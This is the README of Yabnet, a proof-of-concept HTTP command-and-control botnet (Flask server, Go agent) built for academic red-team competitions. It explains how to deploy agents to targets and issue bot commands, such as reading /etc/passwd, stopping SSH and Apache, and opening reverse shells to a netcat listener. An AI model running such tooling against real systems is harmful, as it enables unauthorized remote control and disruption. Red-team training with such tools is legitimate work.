# Yabnet
Yet Another Botnet, PoC created for educational purposes only.
Yabnet is a HTTP based C2 server and agent that was designed, created, and intended to be used in an academic Attack/Defense competition environment. 

Yabnet server is written in Python3++ Flask, deployed in docker. Yabnet agent is written in Golang.

From setting up the server, freezing the agent, and distributing the agent to the target machine, yabnet aims to work out-of-the-box. That way, the red teamers could focus on more important stuffs, such as persistence. 

## Disclaimer
Yabnet is a proof of concept tool which was only created for educational purposes in classroom and cybersecurity related competitions. This tool is not created, nor is good enough for any real world usage. I do not condone use of this tool anything other than educational purposes. Using any of the files of yabnet in/against a system that you do not own is illegal, and you will get caught.

-----------

## Under Construction - TODO 

**Yabnet is currently under construction.**
- [x] Dockerize server 
- [x] Create agent in `golang`, instead of using python 
- [x] Support windows for agent 
- [x] Clean up debugging codes in all files 
- [x] Enhance golang agent & generation of golang 
- [x] Enhance README documentation and usage
- [ ] Add upload feature from master to server 
- [ ] Finalize and structure all in-code comments  
- [ ] Support communicating with PWNBOARD 

-----------

## Installation 

**Yabnet requires python3, GOLANG, curl and docker**

**Due to laziness, yabnet currently requires to be installed in the /opt directory.**

### Server configuration & setup
**Edit `Prodconfig` in `/yabnet/server/config.py` first.**
```
cd /opt/yabnet/server

docker build -t yabnet .
docker run -p <ip>:<port>:<port> yabnet

```

### Agent setup - Golang 

**Generating Agent through master console**
```
Yabnet>> generate -i <serverip> -p <serverport>
Yabnet>> generate -i 192.168.204.153 -p 5000 -w   // -w is for Windows
```

**Transfer the agent file** 

Transfer `/opt/yabnet/agent/agent` or `/opt/yabnet/agent/agent.exe` to the target machine and run it. Feel free to change the name of the executable. 

### Master setup

Use the credential that was configured in `/yabnet/server/config.py` file.

```
python3 /opt/yabnet/master/master.py
Yabnet>> login -r localhost -u <user> -p <password>
Yabnet>> list

Yabnet>> push -h 
``` 


## Components 

**Server and Agent**

Server = Python flask application inside Docker container 

Agent = Golang based static executable 

Master = Python console application for interacting with the server 

**Utility scripts** - In Progress 

`/yabnet/agent/competition_deployer.py` = Python script which helps to distribute and drops agent file to specific range of IP addresses via SSH


## Operation 

The master console has various commands that can be used for controlling the bots. 

**All commands have `-h` help flag**

| Command | Description | Examples | 
| --- | --- | --- |
| login | Login to the server as a master | `login -r 10.0.0.1:443 -u admin -p password` | 
| generate | Compile and generate golang agent binary. Supports x64 of linux, windows | `generate -i 10.0.0.1 -p 443` | 
| list | List all currently registered bots | `list` |
| push | Push a command to bot(s) | `push -t <botid>,<botid> -c "cat /etc/passwd | grep backdoor"` | 
| download | Command a bot to download a file from the server | `download -t <botid> -f test.txt -d c:\users\administrator\a.txt` | 
| reverse | Command a bot to start a reverse shell back to server | `reverse -t <botid> -p <server_listening_port>` | 
| broadcast | Push a command to entire bots (Not Recommended) | `broadcast -c "systemctl stop ssh"` | 
| cleanup | Remove all staged commands for all bots | `cleanup` | 
| help, ? | List all possible commands | `help` | 

**Notes** 
1. Specifying multiple targets with `,` comma separator is possible. 

`ex) push -t 1,2,3,4 -c "systemctl stop apache2"`


2. Reverse shell command requires the master to open a new console and setup a netcat listener. 

`ex) reverse -t 11 -p 31337` 

`ex) nc -lvnp 31337         // And then for the reverse shell from 10.0.3.4` 

3. The server is hosting files in `/yabnet/server/uploads/` directory.

4. All commands have `-h` help flag available.

## Demo
<insert youtubelink here>

## Special Thanks 
[NotoriousRebel](https://github.com/NotoriousRebel) - "Every red teamer should create their own C2"
